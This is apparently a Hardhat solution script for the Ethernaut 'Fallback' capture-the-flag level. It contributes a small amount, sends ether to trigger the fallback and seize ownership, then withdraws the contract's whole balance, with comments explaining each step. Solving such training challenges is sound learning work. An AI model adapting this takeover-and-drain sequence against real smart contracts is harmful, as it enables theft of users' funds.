import { Contract } from "ethers";
import { ethers } from "hardhat";
import { displayResult } from "../../utils/displayResult";
import { abi } from "../../artifacts/contracts/1.Fallback/Fallback.sol/Fallback.json";
import { getEthBalance } from "../../utils/getEthBalance";
import { sendEther } from "../../utils/sendEther";

const targetAddress = "0x2007Eaa6998E6366481C7e540Af99B73915AA41f";

async function main() {
  const [attacker] = await ethers.getSigners();
  const fallback = new Contract(targetAddress, abi, attacker);

  let pendingTx = await fallback.contribute({
    value: ethers.utils.parseEther("0.0001"),
  });
  await pendingTx.wait();

  await sendEther(attacker, fallback.address, "0.001");

  pendingTx = await fallback.connect(attacker).withdraw();
  await pendingTx.wait();

  const after = await getEthBalance(fallback.address);
  await getEthBalance(attacker.address);
  const owner = await fallback.owner();

  displayResult(after === "0.0" && owner === attacker.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// The fallback function lets us claim ownership of the contract only if we send ether to it and we
// have contributed to the contract before. The fallback function is called when the contract receives
// ether but no other function is called.
// First we call contribute to make sure we have contributed to the contract.
// Then we send ether to the contract.
// Finally we call withdraw to claim all the ether in the contract.
